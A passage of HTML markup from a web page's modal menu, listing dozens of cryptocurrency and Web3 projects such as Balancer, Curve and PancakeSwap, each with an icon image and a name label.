                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="elyfi-v2" src="./img/elyfi_v2.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">elyfi-v2</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="comm" src="./img/Comm.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Comm</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="riverex" src="./img/Riverex.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Riverex</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kazm" src="./img/Kazm.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kazm</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="oraqle" src="./img/Oraqle.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Oraqle</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="transaction manager" src="./img/Transaction_Manager.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Transaction Manager</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="virtuesekai" src="./img/VirtueSekai.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">VirtueSekai</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="balancer" src="./img/Balancer.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Balancer</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="perpetual protocol" src="./img/Perpetual_Protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Perpetual Protocol</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zealy" src="./img/Zealy.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zealy</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="award pool" src="./img/Award_Pool.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Award Pool</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rentafi" src="./img/RentaFi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">RentaFi</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="beamer bridge" src="./img/Beamer_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Beamer Bridge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gearbox" src="./img/gearbox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">gearbox</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="optimisticloogies" src="./img/OptimisticLoogies.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OptimisticLoogies</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="token tool by bitbond" src="./img/Token_Tool_by_Bitbond.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Token Tool by Bitbond</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hop" src="./img/Hop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Hop</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sparkswap" src="./img/SparkSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SparkSwap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="leisurepay" src="./img/LeisurePay.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LeisurePay</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="octus bridge" src="./img/Octus_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Octus Bridge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pwn" src="./img/PWN.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PWN</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dipoleswap" src="./img/DipoleSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DipoleSwap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="faye" src="./img/Faye.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Faye</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tengri.io" src="./img/Tengri_io.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tengri.io</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cask protocol" src="./img/Cask_Protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cask Protocol</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zookeeper" src="./img/ZooKeeper.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ZooKeeper</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fusion web3 domains" src="./img/Fusion_Web3_Domains.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fusion Web3 Domains</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="idriss" src="./img/IDriss.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">IDriss</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="marinade finance" src="./img/Marinade_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Marinade Finance</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dexstein" src="./img/DEXStein.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DEXStein</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ixir" src="./img/ixir.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ixir</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="wan bridge" src="./img/Wan_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Wan Bridge</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mailchain" src="./img/Mailchain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Mailchain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="extractodao-dev" src="./img/extractodao_dev.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">extractodao-dev</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="chainjet" src="./img/ChainJet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ChainJet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dexcoinapp" src="./img/DEXCoinApp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DEXCoinApp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gaspack app" src="./img/Gaspack_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gaspack App</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="1inch network" src="./img/1inch_Network.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">1inch Network</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rainbow bridge" src="./img/Rainbow_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Rainbow Bridge</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="frax" src="./img/FRAX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">FRAX</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="manifold studio" src="./img/Manifold_Studio.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Manifold Studio</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="babydoge nft" src="./img/BabyDoge_NFT.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BabyDoge NFT</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="akka finance" src="./img/AKKA_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AKKA Finance</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="loot8" src="./img/LOOT8.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LOOT8</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="orcafi" src="./img/orcafi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">orcafi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="deschool" src="./img/DeSchool.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DeSchool</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="anotherblock" src="./img/anotherblock.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">anotherblock</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ensurer" src="./img/Ensurer.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ensurer</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pooky" src="./img/Pooky.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Pooky</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="covalent" src="./img/Covalent.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Covalent</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aqua" src="./img/AQUA.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AQUA</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="walkingdoggo" src="./img/WalkingDoggo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">WalkingDoggo</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="jumptask" src="./img/JumpTask.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">JumpTask</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="thingsix" src="./img/ThingsIX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ThingsIX</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="debox" src="./img/DeBox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DeBox</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="o3 swap" src="./img/O3_Swap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">O3 Swap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bulksender" src="./img/Bulksender.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bulksender</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="raffl" src="./img/Raffl.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Raffl</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="staked celo" src="./img/Staked_Celo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Staked Celo</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="supercart" src="./img/Supercart.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Supercart</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flare focus fcx" src="./img/Flare_Focus_FCX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flare Focus FCX</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="degame" src="./img/DeGame.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DeGame</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gravita protocol" src="./img/Gravita_Protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gravita Protocol</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tranchess" src="./img/Tranchess.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tranchess</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="12swap" src="./img/12Swap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">12Swap</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="agave" src="./img/Agave.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Agave</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="illiquid market" src="./img/Illiquid_Market.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Illiquid Market</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="osean" src="./img/osean.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">osean</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="roco.finance: payment" src="./img/Roco_Finance_Payment.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Roco.Finance: Payment</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="yearn" src="./img/Yearn.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Yearn</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unvest" src="./img/Unvest.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unvest</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mcapital" src="./img/MCapital.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MCapital</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xfai" src="./img/Xfai.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Xfai</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="seashell" src="./img/Seashell.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Seashell</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="spirit-dao" src="./img/Spirit_DAO.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Spirit-DAO</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="repoint" src="./img/repoint.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">repoint</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="paintswap" src="./img/PaintSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PaintSwap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kinkbnb" src="./img/KinkBNB.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KinkBNB</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aiptp" src="./img/AIPTP.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AIPTP</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="buffer finance" src="./img/Buffer_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Buffer Finance</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="collectz.xyz" src="./img/Collectz_xyz.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Collectz.xyz</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="monetha" src="./img/Monetha.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Monetha</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="escrowsg" src="./img/escrowsg.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">escrowsg</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="elmonx" src="./img/ElmonX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ElmonX</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bebop" src="./img/Bebop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bebop</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="airdrop gameswift" src="./img/Airdrop_Gameswift.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Airdrop Gameswift</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="auxodao" src="./img/AuxoDAO.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AuxoDAO</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dolz" src="./img/DOLZ.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DOLZ</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tkn: token name service" src="./img/TKN_Token_Name_Service.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">TKN: Token Name Service</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethglobal" src="./img/ETHGlobal.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ETHGlobal</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="holograph develop" src="./img/Holograph_Develop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Holograph Develop</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="uaht.io" src="./img/uaht_io.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">uaht.io</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cointacted" src="./img/Cointacted.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cointacted</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="akita" src="./img/Akita.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Akita</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="curve" src="./img/Curve.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Curve</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="yaya" src="./img/YaYa.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">YaYa</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="artwear" src="./img/Artwear.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Artwear</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dropspace" src="./img/dropspace.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">dropspace</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stakewise" src="./img/StakeWise.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">StakeWise</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crybu" src="./img/Crybu.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crybu</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="baby doge swap widget" src="./img/Baby_Doge_Swap_Widget.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Baby Doge Swap Widget</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="baby doge chess" src="./img/Baby_Doge_Chess.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Baby Doge Chess</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sft protocol" src="./img/SFT_protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SFT protocol</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="alphaguilty" src="./img/AlphaGuilty.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AlphaGuilty</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="olive" src="./img/Olive.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Olive</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="curve-dapp" src="./img/curve_dapp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">curve-dapp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kriller" src="./img/KRILLER.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KRILLER</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gangster all star - bounties" src="./img/Gangster_All_Star_Bounties.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gangster All Star - Bounties</span
              >
            </div>
          </div>
          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="anonymice"
                src="./img/Anonymice.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">Anonymice</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cere bridge" src="./img/Cere_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cere Bridge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="housefly" src="./img/Housefly.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Housefly</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nft jungle" src="./img/NFT_Jungle.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">NFT Jungle</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="umbra" src="./img/Umbra.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Umbra</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lifeform" src="./img/lifeform.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">lifeform</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="decentraplace" src="./img/Decentraplace.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Decentraplace</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="partyfinance" src="./img/PartyFinance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PartyFinance</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stems" src="./img/Stems.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stems</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="landrocker website v2" src="./img/Landrocker_website_v2.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Landrocker website v2</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="loop2earn" src="./img/Loop2Earn.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Loop2Earn</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flooz" src="./img/Flooz.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flooz</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="li.fi widget" src="./img/LI_FI_Widget.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LI.FI Widget</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dodao.dev" src="./img/dodao_dev.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">dodao.dev</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ēnosys bridge" src="./img/Enosys_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ēnosys Bridge</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="earnifi" src="./img/Earnifi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Earnifi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gallery" src="./img/Gallery.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gallery</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zksync portal" src="./img/zkSync_Portal.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">zkSync Portal</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="smoldapp" src="./img/Smoldapp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Smoldapp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="platform gameswift" src="./img/Platform_Gameswift.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Platform Gameswift</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="staking.dxpool" src="./img/staking_dxpool.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">staking.dxpool</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lens invites" src="./img/Lens_Invites.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Lens Invites</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="solid world" src="./img/Solid_World.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Solid World</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fanbase.io website" src="./img/Fanbase_io_Website.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fanbase.io Website</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pancakeswap" src="./img/PancakeSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PancakeSwap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
